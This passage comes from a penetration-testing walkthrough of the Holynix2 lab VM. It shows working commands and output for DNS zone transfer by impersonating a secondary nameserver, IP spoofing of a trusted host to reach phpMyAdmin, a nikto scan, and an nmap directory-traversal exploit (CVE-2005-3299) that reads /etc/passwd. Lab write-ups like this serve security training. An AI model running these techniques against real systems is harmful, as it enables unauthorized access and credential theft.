<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="go">&lt;title&gt;403 Forbidden&lt;/title&gt;</span>
<span class="go">&lt;/head&gt;&lt;body&gt;</span>
<span class="go">&lt;h1&gt;Forbidden&lt;/h1&gt;</span>
<span class="go">&lt;p&gt;You don&#39;t have permission to access /phpMyAdmin</span>
<span class="go">on this server.&lt;/p&gt;</span>
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
</pre></div>
</div>
<p>Finally, there is the hint DNS would allow harvesting user names:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/holynix2/spider$</span> <span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.88
<span class="hll"><span class="gp">hacker@kali:~/pentest/holynix2/spider$</span> curl --silent http://<span class="nv">$T</span>/ <span class="p">|</span> egrep <span class="s1">&#39;(nameservers|directory)&#39;</span>
</span><span class="hll"><span class="go">Our nameservers are located at ns1.zincftp.com &amp;amp; ns2.zincftp.com&lt;br /&gt;</span>
</span><span class="hll"><span class="go">To access your web directory navigate to &lt;b&gt;http://username.zincftp.com&lt;/b&gt;&lt;/div&gt;</span>
</span></pre></div>
</div>
<p>So we turn to DNS next.</p>
</div>
</div>
<div class="section" id="dns-reconnaisance">
<h4>3.16.2.3.3. DNS reconnaisance<a class="headerlink" href="#dns-reconnaisance" title="Permalink to this headline">¶</a></h4>
<div class="section" id="dns-zone-transfer">
<h5>3.16.2.3.3.1. DNS zone transfer<a class="headerlink" href="#dns-zone-transfer" title="Permalink to this headline">¶</a></h5>
<p>So a zone transfer would definitely yield usernames and possibly other useful information. But DNS zone transfers are unsurprisingly restricted:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/holynix2/spider$ cd $</span>PT/dns
<span class="hll"><span class="gp">hacker@kali:~/pentest/holynix2/dns$</span> dig axfr @<span class="nv">$T</span> zincftp.com
</span><span class="go">; &lt;&lt;&gt;&gt; DiG 9.9.5-9-Debian &lt;&lt;&gt;&gt; axfr @192.168.1.88 zincftp.com</span>
<span class="go">; (1 server found)</span>
<span class="go">;; global options: +cmd</span>
<span class="hll"><span class="go">; Transfer failed.</span>
</span></pre></div>
</div>
<p>But there’s that nonexistent NS2 &#64; 192.168.1.89 to impersonate. If there were a real NS2 running we would have to start <code class="docutils literal"><span class="pre">$SUDO</span> <span class="pre">arpspoof</span> <span class="pre">-t</span> <span class="pre">192.168.1.88</span> <span class="pre">192.168.1.89</span></code> in a separate window in order to impersonate 192.168.1.89. But that isn’t needed here as the server wasn’t up and running. So we add NS2’s address as a secondary and change the routing to $T to use NS2’s as the source address:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="hll"><span class="nv">ATTACKER</span><span class="o">=</span><span class="m">192</span>.168.1.104
</span><span class="hll"><span class="nv">NS2</span><span class="o">=</span><span class="m">192</span>.168.1.89
</span><span class="hll"><span class="nv">IF</span><span class="o">=</span>eth0
</span><span class="hll"><span class="nb">cd</span> <span class="nv">$PT</span>/dns
</span><span class="hll"><span class="c1"># IPs - attacker and nonexistent secondary nameserver</span>
</span><span class="hll"><span class="c1"># add NS2 address to interface</span>
</span><span class="hll">ip addr show
</span><span class="hll"><span class="nv">$SUDO</span> ip addr add <span class="nv">$NS2</span>/24 dev <span class="nv">$IF</span>
</span><span class="hll">ip addr show
</span><span class="hll"><span class="c1"># change routing to use $NS2 as source address to $T</span>
</span><span class="hll">ip route show
</span><span class="hll"><span class="nv">$SUDO</span> ip route add <span class="nv">$T</span>/32 dev <span class="nv">$IF</span> src <span class="nv">$NS2</span>
</span><span class="hll">ip route show
</span><span class="hll"><span class="c1"># now do a DNS AXFR zone transfer - allowed from NS2</span>
</span><span class="hll">dig axfr @<span class="nv">$T</span> zincftp.com <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span> &gt; dns_axfr.txt
</span><span class="hll"><span class="c1"># undo the the networking changes</span>
</span><span class="hll"><span class="nv">$SUDO</span> ip route del <span class="nv">$T</span>/32
</span><span class="hll">ip route show
</span><span class="hll"><span class="nv">$SUDO</span> ip addr del <span class="nv">$NS2</span> dev <span class="nv">$IF</span>
</span><span class="hll">ip addr show <span class="nv">$IF</span>
</span></pre></div>
</div>
<p>Running this gets the axfr zone transer:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/pentest/holynix2/dns$</span> <span class="nv">ATTACKER</span><span class="o">=</span><span class="m">192</span>.168.1.104
</span><span class="hll"><span class="gp">hacker@kali:~/pentest/holynix2/dns$</span> <span class="nv">NS2</span><span class="o">=</span><span class="m">192</span>.168.1.89
</span><span class="hll"><span class="gp">hacker@kali:~/pentest/holynix2/dns$</span> <span class="nv">IF</span><span class="o">=</span>eth0
</span><span class="hll"><span class="gp">hacker@kali:~/pentest/holynix2/dns$ cd $</span>PT/dns
</span><span class="hll"><span class="gp">hacker@kali:~/pentest/holynix2/dns$ #</span> add NS2 address to interface
</span><span class="hll"><span class="gp">hacker@kali:~/pentest/holynix2/dns$</span> ip addr show
</span><span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="hll"><span class="go">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP qlen 1000</span>
</span><span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="hll"><span class="go">    inet 192.168.1.106/24 brd 192.168.1.255 scope global eth0</span>
</span><span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="hll"><span class="gp">hacker@kali:~/pentest/holynix2/users$ $</span>SUDO ip addr add <span class="nv">$NS2</span>/24 dev <span class="nv">$IF</span>
</span><span class="hll"><span class="gp">hacker@kali:~/pentest/holynix2/users$</span> ip addr show
</span><span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="hll"><span class="go">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP qlen 1000</span>
</span><span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="hll"><span class="go">    inet 192.168.1.106/24 brd 192.168.1.255 scope global eth0</span>
</span><span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="hll"><span class="go">    inet 192.168.1.89/24 scope global secondary eth0</span>
</span><span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="hll"><span class="gp">hacker@kali:~/pentest/holynix2/dns$ #</span> change routing to use <span class="nv">$NS2</span> as <span class="nb">source</span> address to <span class="nv">$T</span>
</span><span class="hll"><span class="gp">hacker@kali:~/pentest/holynix2/dns$</span> ip route show
</span><span class="hll"><span class="go">default via 192.168.1.1 dev eth0</span>
</span><span class="hll"><span class="go">192.168.1.0/24 dev eth0  proto kernel  scope link  src 192.168.1.106</span>
</span><span class="hll"><span class="gp">hacker@kali:~/pentest/holynix2/dns$ $</span>SUDO ip route add <span class="nv">$T</span>/32 dev <span class="nv">$IF</span> src <span class="nv">$NS2</span>
</span><span class="hll"><span class="gp">hacker@kali:~/pentest/holynix2/dns$</span> ip route show
</span><span class="hll"><span class="go">default via 192.168.1.1 dev eth0</span>
</span><span class="hll"><span class="go">192.168.1.0/24 dev eth0  proto kernel  scope link  src 192.168.1.106</span>
</span><span class="hll"><span class="go">192.168.1.88 dev eth0  scope link  src 192.168.1.89</span>
</span><span class="hll"><span class="gp">hacker@kali:~/pentest/holynix2/dns$</span> dig axfr @<span class="nv">$T</span> zincftp.com <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span> &gt; dns_axfr.txt
</span><span class="hll"><span class="gp">hacker@kali:~/pentest/holynix2/dns$ $</span>SUDO ip route del <span class="nv">$T</span>/32
</span><span class="hll"><span class="gp">hacker@kali:~/pentest/holynix2/dns$</span> ip route show
</span><span class="hll"><span class="go">default via 192.168.1.1 dev eth0</span>
</span><span class="hll"><span class="go">192.168.1.0/24 dev eth0  proto kernel  scope link  src 192.168.1.106</span>
</span><span class="hll"><span class="gp">hacker@kali:~/pentest/holynix2/dns$ $</span>SUDO ip addr del <span class="nv">$NS2</span> dev <span class="nv">$IF</span>
</span><span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="hll"><span class="gp">hacker@kali:~/pentest/holynix2/dns$</span> ip addr show <span class="nv">$IF</span>
</span><span class="hll"><span class="go">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP qlen 1000</span>
</span><span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="hll"><span class="go">    inet 192.168.1.106/24 brd 192.168.1.255 scope global eth0</span>
</span><span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
</pre></div>
</div>
</div>
<div class="section" id="what-s-in-the-dns-zone">
<h5>3.16.2.3.3.2. What’s in the DNS zone?<a class="headerlink" href="#what-s-in-the-dns-zone" title="Permalink to this headline">¶</a></h5>
<p>Here’s the axfr file:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nb">cd</span> <span class="nv">$PT</span>/dns
cat dns_axfr.txt
</pre></div>
</div>
<p>Running this gives us:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/pentest/holynix2/dns$</span> cat dns_axfr.txt
</span>
<span class="hll"><span class="go">; &lt;&lt;&gt;&gt; DiG 9.8.4-rpz2+rl005.12-P1 &lt;&lt;&gt;&gt; axfr @192.168.1.88 zincftp.com</span>
</span><span class="go">; (1 server found)</span>
<span class="go">;; global options: +cmd</span>
<span class="hll"><span class="go">zincftp.com.          38400   IN      SOA     ns1.zincftp.com. ns2.zincftp.com. 2006071801 28800 3600 604800 38400</span>
</span><span class="hll"><span class="go">zincftp.com.          38400   IN      NS      ns1.zincftp.com.</span>
</span><span class="hll"><span class="go">zincftp.com.          38400   IN      NS      ns2.zincftp.com.</span>
</span><span class="hll"><span class="go">zincftp.com.          38400   IN      MX      10 mta.zincftp.com.</span>
</span><span class="hll"><span class="go">zincftp.com.          38400   IN      A       192.168.1.88</span>
</span><span class="go">ahuxley.zincftp.com.  38400   IN      A       192.168.1.88</span>
<span class="go">amckinley.zincftp.com.        38400   IN      A       192.168.1.88</span>
<span class="go">bzimmerman.zincftp.com.       38400   IN      A       192.168.1.88</span>
<span class="go">cbergey.zincftp.com.  38400   IN      A       192.168.1.88</span>
<span class="go">cfinnerly.zincftp.com.        38400   IN      A       192.168.1.88</span>
<span class="go">cjalong.zincftp.com.  38400   IN      A       192.168.1.88</span>
<span class="go">cmahong.zincftp.com.  38400   IN      A       192.168.1.88</span>
<span class="go">cmanson.zincftp.com.  38400   IN      A       192.168.1.88</span>
<span class="go">ddonnovan.zincftp.com.        38400   IN      A       192.168.1.88</span>
<span class="go">ddypsky.zincftp.com.  38400   IN      A       192.168.1.88</span>
<span class="hll"><span class="go">dev.zincftp.com.      38400   IN      A       192.168.1.88</span>
</span><span class="go">dhammond.zincftp.com. 38400   IN      A       192.168.1.88</span>
<span class="go">dmoran.zincftp.com.   38400   IN      A       192.168.1.88</span>
<span class="go">dsummers.zincftp.com. 38400   IN      A       192.168.1.88</span>
<span class="go">evorhees.zincftp.com. 38400   IN      A       192.168.1.88</span>
<span class="go">gwelch.zincftp.com.   38400   IN      A       192.168.1.88</span>
<span class="go">hmcknight.zincftp.com.        38400   IN      A       192.168.1.88</span>
<span class="go">jgacy.zincftp.com.    38400   IN      A       192.168.1.88</span>
<span class="go">jsmith.zincftp.com.   38400   IN      A       192.168.1.88</span>
<span class="go">jstreet.zincftp.com.  38400   IN      A       192.168.1.88</span>
<span class="go">kmccallum.zincftp.com.        38400   IN      A       192.168.1.88</span>
<span class="go">lnickerbacher.zincftp.com. 38400 IN   A       192.168.1.88</span>
<span class="go">lsanderson.zincftp.com.       38400   IN      A       192.168.1.88</span>
<span class="go">lwestre.zincftp.com.  38400   IN      A       192.168.1.88</span>
<span class="hll"><span class="go">mta.zincftp.com.      38400   IN      A       10.0.192.48</span>
</span><span class="go">ncobol.zincftp.com.   38400   IN      A       192.168.1.88</span>
<span class="hll"><span class="go">ns1.zincftp.com.      38400   IN      A       192.168.1.88</span>
</span><span class="hll"><span class="go">ns2.zincftp.com.      38400   IN      A       192.168.1.89</span>
</span><span class="go">rcropper.zincftp.com. 38400   IN      A       192.168.1.88</span>
<span class="go">rfrost.zincftp.com.   38400   IN      A       192.168.1.88</span>
<span class="go">rwoo.zincftp.com.     38400   IN      A       192.168.1.88</span>
<span class="go">skrymple.zincftp.com. 38400   IN      A       192.168.1.88</span>
<span class="go">splath.zincftp.com.   38400   IN      A       192.168.1.88</span>
<span class="go">tmartin.zincftp.com.  38400   IN      A       192.168.1.88</span>
<span class="hll"><span class="go">trusted.zincftp.com.  38400   IN      A       192.168.1.34</span>
</span><span class="hll"><span class="go">www.zincftp.com.      38400   IN      A       192.168.1.88</span>
</span><span class="hll"><span class="go">zincftp.com.          38400   IN      SOA     ns1.zincftp.com. ns2.zincftp.com. 2006071801 28800 3600 604800 38400</span>
</span><span class="go">;; Query time: 2 msec</span>
<span class="go">;; SERVER: 192.168.1.88#53(192.168.1.88)</span>
<span class="go">;; WHEN: Sat Jun  6 12:59:27 2015</span>
<span class="go">;; XFR size: 42 records (messages 1, bytes 1021)</span>
</pre></div>
</div>
<p>Three items stand out:</p>
<ul class="simple">
<li>FTP user names (30 of them)
These would be useful if we wished to do some password cracking. However, online password cracking is notoriously slow for FTP and SSH. We’ll ignore those names for now.</li>
<li>dev.zincftp.com
Maybe for a development server, so we will ignore for now.</li>
<li>trusted.zincftp.com (192.168.1.34)
This one looks interesting and impersonating it like NS2 above will be tried.</li>
<li>mta.zincftp.com (10.0.192.48)
Since we won’t set up an email server we will ignore for now.</li>
</ul>
</div>
</div>
<div class="section" id="impersonating-trusted-zincftp-com">
<h4>3.16.2.3.4. Impersonating trusted.zincftp.com<a class="headerlink" href="#impersonating-trusted-zincftp-com" title="Permalink to this headline">¶</a></h4>
<div class="section" id="trusted-zincftp-com-can-access-phpmyadmin">
<h5>3.16.2.3.4.1. trusted.zincftp.com can access phpMyAdmin<a class="headerlink" href="#trusted-zincftp-com-can-access-phpmyadmin" title="Permalink to this headline">¶</a></h5>
<p>Note - if trusted.zincftp.com is actually running you would have to start <code class="docutils literal"><span class="pre">arpspoof</span> <span class="pre">-t</span> <span class="pre">192.168.1.88</span> <span class="pre">192.168.1.34</span></code> to allow the IP impersonation. Also, be sure to use the DNS from $T (probably setting up <strong>nameserver 192.168.1.88</strong> in <code class="file docutils literal"><span class="pre">/etc/resolv.conf</span></code>). Here goes the impersonation without the <code class="docutils literal"><span class="pre">arpspoof</span></code>:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">IF</span><span class="o">=</span>eth0
<span class="nv">ATTACKER</span><span class="o">=</span><span class="m">192</span>.168.1.104
<span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.88
<span class="nv">TRUSTED</span><span class="o">=</span><span class="m">192</span>.168.1.34
<span class="nb">cd</span> <span class="nv">$PT</span>/exploit
<span class="c1"># add NS2 address to interface</span>
ip addr show
<span class="nv">$SUDO</span> ip addr add <span class="nv">$TRUSTED</span>/24 dev <span class="nv">$IF</span>
ip addr show
<span class="c1"># change routing to use $TRUSTED as source address to $T</span>
ip route show
<span class="nv">$SUDO</span> ip route add <span class="nv">$T</span>/32 dev <span class="nv">$IF</span> src <span class="nv">$TRUSTED</span>
ip route show
<span class="c1"># now try access - allowed from TRUSTED</span>
curl --silent http://<span class="nv">$T</span>/phpMyAdmin/
</pre></div>
</div>
<p>Running this gives:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/holynix2/dns$</span> <span class="nv">IF</span><span class="o">=</span>eth0
<span class="gp">hacker@kali:~/pentest/holynix2/dns$</span> <span class="nv">ATTACKER</span><span class="o">=</span><span class="m">192</span>.168.1.104
<span class="gp">hacker@kali:~/pentest/holynix2/dns$</span> <span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.88
<span class="gp">hacker@kali:~/pentest/holynix2/dns$</span> <span class="nv">TRUSTED</span><span class="o">=</span><span class="m">192</span>.168.1.34
<span class="gp">hacker@kali:~/pentest/holynix2/dns$ cd $</span>PT/exploit
<span class="gp">hacker@kali:~/pentest/holynix2/exploit$ #</span> add NS2 address to interface
<span class="gp">hacker@kali:~/pentest/holynix2/exploit$</span> ip addr show
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="go">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP qlen 1000</span>
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="go">    inet 192.168.1.104/24 brd 192.168.1.255 scope global eth0</span>
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="gp">hacker@kali:~/pentest/holynix2/exploit$ $</span>SUDO ip addr add <span class="nv">$TRUSTED</span>/24 dev <span class="nv">$IF</span>
<span class="gp">hacker@kali:~/pentest/holynix2/exploit$</span> ip addr show
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="go">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP qlen 1000</span>
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="go">    inet 192.168.1.106/24 brd 192.168.1.255 scope global eth0</span>
<span class="go">       valid_lft forever preferred_lft forever</span>
<span class="go">    inet 192.168.1.34/24 scope global secondary eth0</span>
<span class="go">       valid_lft forever preferred_lft forever</span>
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="gp">hacker@kali:~/pentest/holynix2/exploit$ $</span>SUDO ip route add <span class="nv">$T</span>/32 dev <span class="nv">$IF</span> src <span class="nv">$TRUSTED</span>
<span class="gp">hacker@kali:~/pentest/holynix2/exploit$</span> ip route show
<span class="go">default via 192.168.1.1 dev eth0</span>
<span class="go">192.168.1.0/24 dev eth0  proto kernel  scope link  src 192.168.1.106</span>
<span class="go">192.168.1.88 dev eth0  scope link  src 192.168.1.34</span>
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="gp">hacker@kali:~/pentest/holynix2/exploit$</span> curl http://<span class="nv">$T</span>/phpMyAdmin/
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="go">&lt;title&gt;phpMyAdmin  - 192.168.1.88&lt;/title&gt;</span>
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="go">&lt;/html&gt;</span>
</pre></div>
</div>
<p>So impersonating TRUSTED allows passwordless access to the phpMyAdmin web page and allows us to create no end of mischief on holynix2.</p>
</div>
<div class="section" id="rerunning-nikto-as-trusted-zincftp-com">
<h5>3.16.2.3.4.2. Rerunning nikto as trusted.zincftp.com<a class="headerlink" href="#rerunning-nikto-as-trusted-zincftp-com" title="Permalink to this headline">¶</a></h5>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nb">cd</span> <span class="nv">$PT</span>/spider
nikto -output nikto_trusted.txt -host <span class="nv">$T</span>
</pre></div>
</div>
<p>Running this gives:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/holynix2/exploit$ cd $</span>PT/spider
<span class="hll"><span class="gp">hacker@kali:~/pentest/holynix2/spider$</span> nikto -output nikto_trusted.txt -host <span class="nv">$T</span>
</span><span class="go">- Nikto v2.1.6</span>
<span class="go">---------------------------------------------------------------------------</span>
<span class="go">+ Target IP:          192.168.1.88</span>
<span class="go">+ Target Hostname:    192.168.1.88</span>
<span class="go">+ Target Port:        80</span>
<span class="go">+ Start Time:         2015-06-08 18:29:11 (GMT-7)</span>
<span class="go">---------------------------------------------------------------------------</span>
<span class="go">+ Server: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.12 with Suhosin-Patch</span>
<span class="go">+ Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.12</span>
<span class="go">+ The anti-clickjacking X-Frame-Options header is not present.</span>
<span class="go">+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)</span>
<span class="go">+ PHP/5.2.4-2ubuntu5.12 appears to be outdated (current is at least 5.4.26)</span>
<span class="go">+ Apache/2.2.8 appears to be outdated (current is at least Apache/2.4.7). Apache 2.0.65 (final release) and 2.2.26 are also current.</span>
<span class="go">+ Uncommon header &#39;tcn&#39; found, with contents: list</span>
<span class="go">+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for &#39;index&#39; were found: index.php</span>
<span class="go">+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.</span>
<span class="go">+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST</span>
<span class="go">+ Uncommon header &#39;x-ob_mode&#39; found, with contents: 1</span>
<span class="go">+ OSVDB-8450: /phpMyAdmin/db_details_importdocsql.php?submit_show=true&amp;do=import&amp;docpath=../: phpMyAdmin allows directory listings remotely. Upgrade to version 2.5.3 or higher. http://www.securityfocus.com/bid/7963.</span>
<span class="go">+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span>
<span class="go">+ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span>
<span class="go">+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span>
<span class="go">+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span>
<span class="go">+ Cookie pma_theme created without the httponly flag</span>
<span class="go">+ Cookie pma_collation_connection created without the httponly flag</span>
<span class="go">+ OSVDB-3092: /phpMyAdmin/: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.</span>
<span class="go">+ OSVDB-3092: /register/: This might be interesting...</span>
<span class="go">+ OSVDB-3268: /icons/: Directory indexing found.</span>
<span class="hll"><span class="go">+ /phpMyAdmin/export.php?what=../../../../../../../../../../../../etc/passwd%00: PHP include error may indicate local or remote file inclusion is possible.</span>
</span><span class="go">+ Server leaks inodes via ETags, header found with file /icons/README, inode: 40753, size: 5108, mtime: Tue Aug 28 03:48:10 2007</span>
<span class="go">+ OSVDB-3233: /icons/README: Apache default file found.</span>
<span class="go">+ /phpMyAdmin/: phpMyAdmin directory found</span>
<span class="go">+ 6603 requests: 0 error(s) and 23 item(s) reported on remote host</span>
<span class="go">+ End Time:           2015-06-08 18:30:27 (GMT-7) (76 seconds)</span>
<span class="go">---------------------------------------------------------------------------</span>
<span class="go">+ 1 host(s) tested</span>
</pre></div>
</div>
</div>
<div class="section" id="phpmyadmin-file-inclusion-vulnerability">
<h5>3.16.2.3.4.3. phpMyAdmin file inclusion vulnerability<a class="headerlink" href="#phpmyadmin-file-inclusion-vulnerability" title="Permalink to this headline">¶</a></h5>
<p>A search for nikto’s report text “remote file inclusion” led to nmap’s <a class="reference external" href="https://nmap.org/nsedoc/scripts/http-phpmyadmin-dir-traversal.html">http-phpmyadmin-dir-traversal</a>:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nb">cd</span> <span class="nv">$PT</span>/passwords
<span class="nv">FILE</span><span class="o">=</span><span class="s2">&quot;/etc/passwd&quot;</span>
<span class="nv">FILEPATH</span><span class="o">=</span><span class="s2">&quot;../../../../..</span><span class="nv">$FILE</span><span class="s2">&quot;</span>
<span class="nv">OUTFILE</span><span class="o">=</span>passwd.txt
nmap -p80 --script http-phpmyadmin-dir-traversal <span class="se">\</span>
     --script-args<span class="o">=</span><span class="s2">&quot;dir=&#39;/phpMyAdmin/&#39;,file=&#39;</span><span class="nv">$FILEPATH</span><span class="s2">&#39;,outfile=&#39;</span><span class="nv">$OUTFILE</span><span class="s2">&#39;&quot;</span> <span class="se">\</span>
     <span class="nv">$T</span>
</pre></div>
</div>
<p>Running this gives us:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/holynix2/spider$ cd $</span>PT/passwords
<span class="gp">hacker@kali:~/pentest/holynix2/passwords$</span> <span class="nv">FILE</span><span class="o">=</span><span class="s2">&quot;/etc/passwd&quot;</span>
<span class="gp">hacker@kali:~/pentest/holynix2/passwords$ FILEPATH=&quot;../../../../..$</span>FILE<span class="s2">&quot;</span>
<span class="gp">hacker@kali:~/pentest/holynix2/passwords$</span><span class="s2"> OUTFILE=passwd.txt</span>
<span class="gp">hacker@kali:~/pentest/holynix2/passwords$</span><span class="s2"> nmap -p80 --script http-phpmyadmin-dir-traversal \</span>
<span class="s2">&gt;      --script-args=&quot;</span><span class="nv">dir</span><span class="o">=</span><span class="s1">&#39;/phpMyAdmin/&#39;</span>,file<span class="o">=</span><span class="s1">&#39;$FILEPATH&#39;</span>,outfile<span class="o">=</span><span class="s1">&#39;$OUTFILE&#39;</span><span class="s2">&quot; \</span>
<span class="s2">&gt;      </span><span class="nv">$T</span><span class="s2"></span>

<span class="go">Starting Nmap 6.47 ( http://nmap.org ) at 2015-06-08 19:35 PDT</span>
<span class="go">Nmap scan report for 192.168.1.88</span>
<span class="go">Host is up (0.0014s latency).</span>
<span class="go">PORT   STATE SERVICE</span>
<span class="go">80/tcp open  http</span>
<span class="go">| http-phpmyadmin-dir-traversal:</span>
<span class="go">|   VULNERABLE:</span>
<span class="go">|   phpMyAdmin grab_globals.lib.php subform Parameter Traversal Local File Inclusion</span>
<span class="go">|     State: VULNERABLE (Exploitable)</span>
<span class="go">|     IDs:  CVE:CVE-2005-3299</span>
<span class="go">|     Description:</span>
<span class="go">|       PHP file inclusion vulnerability in grab_globals.lib.php in phpMyAdmin 2.6.4 and 2.6.4-pl1 allows remote attackers to include local files via the $__redirect parameter, possibly involving the subform array.</span>
<span class="go">|</span>
<span class="go">|     Disclosure date: 2005-10-nil</span>
<span class="go">|     Extra information:</span>
<span class="go">|       ../../../../../etc/passwd :</span>
<span class="go">|   root:x:0:0:root:/root:/bin/bash</span>
<span class="go">|   daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span>
<span class="go">|   bin:x:2:2:bin:/bin:/bin/sh</span>
<span class="go">|   sys:x:3:3:sys:/dev:/bin/sh</span>
<span class="go">|   sync:x:4:65534:sync:/bin:/bin/sync</span>
<span class="go">|   games:x:5:60:games:/usr/games:/bin/sh</span>
<span class="go">|   man:x:6:12:man:/var/cache/man:/bin/sh</span>
<span class="go">|   lp:x:7:7:lp:/var/spool/lpd:/bin/sh</span>
<span class="go">|   mail:x:8:8:mail:/var/mail:/bin/sh</span>
<span class="go">|   news:x:9:9:news:/var/spool/news:/bin/sh</span>
<span class="go">|   uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh</span>
<span class="go">|   proxy:x:13:13:proxy:/bin:/bin/sh</span>
<span class="go">|   www-data:x:33:33:www-data:/var/www:/bin/sh</span>
<span class="go">|   backup:x:34:34:backup:/var/backups:/bin/sh</span>
<span class="go">|   list:x:38:38:Mailing List Manager:/var/list:/bin/sh</span>
<span class="go">|   irc:x:39:39:ircd:/var/run/ircd:/bin/sh</span>
<span class="go">|   gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh</span>
<span class="go">|   nobody:x:65534:65534:nobody:/nonexistent:/bin/sh</span>
<span class="go">|   libuuid:x:100:101::/var/lib/libuuid:/bin/sh</span>
<span class="go">|   dhcp:x:101:102::/nonexistent:/bin/false</span>
<span class="go">|   syslog:x:102:103::/home/syslog:/bin/false</span>
<span class="go">|   klog:x:103:104::/home/klog:/bin/false</span>
<span class="go">|   bind:x:104:111::/var/cache/bind:/bin/false</span>
<span class="go">|   sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin</span>
<span class="go">|   mysql:x:106:115:MySQL Server,,,:/var/lib/mysql:/bin/false</span>
<span class="go">|   lsanderson:x:1000:114:Lyle Sanderson:/home/lsanderson:/bin/bash</span>
<span class="go">|   cfinnerly:x:1001:100:Chuck Finnerly:/home/cfinnerly:/bin/bash</span>
<span class="go">|   ddonnovan:x:1002:100:David Donnovan:/home/ddonnovan:/bin/bash</span>
<span class="go">|   skrymple:x:1003:100:Shelly Krymple:/home/skrymple:/bin/bash</span>
<span class="go">|   amckinley:x:1004:100:Agustin Mckinley:/home/amckinley:/bin/bash</span>
<span class="go">|   cmahong:x:1005:2002::/home/cmahong:/bin/false</span>
<span class="go">|   lnickerbacher:x:1006:2002::/home/lnickerbacher:/bin/false</span>
<span class="go">|   jstreet:x:1007:2002::/home/jstreet:/bin/false</span>
<span class="go">|   rwoo:x:1008:2002::/home/rwoo:/bin/false</span>
<span class="go">|   kmccallum:x:1009:2002::/home/kmccallum:/bin/false</span>
<span class="go">|   cjalong:x:1010:2002::/home/cjalong:/bin/false</span>
<span class="go">|   jsmith:x:1011:2002::/home/jsmith:/bin/false</span>
<span class="go">|   dhammond:x:1012:2002::/home/dhammond:/bin/false</span>
<span class="go">|   hmcknight:x:1013:2002::/home/hmcknight:/bin/false</span>
<span class="go">|   lwestre:x:1014:2002::/home/lwestre:/bin/false</span>
<span class="go">|   gwelch:x:1015:2002::/home/gwelch:/bin/false</span>
<span class="go">|   dmoran:x:1016:2002::/home/dmoran:/bin/false</span>
<span class="go">|   dsummers:x:1017:2002::/home/dsummers:/bin/false</span>
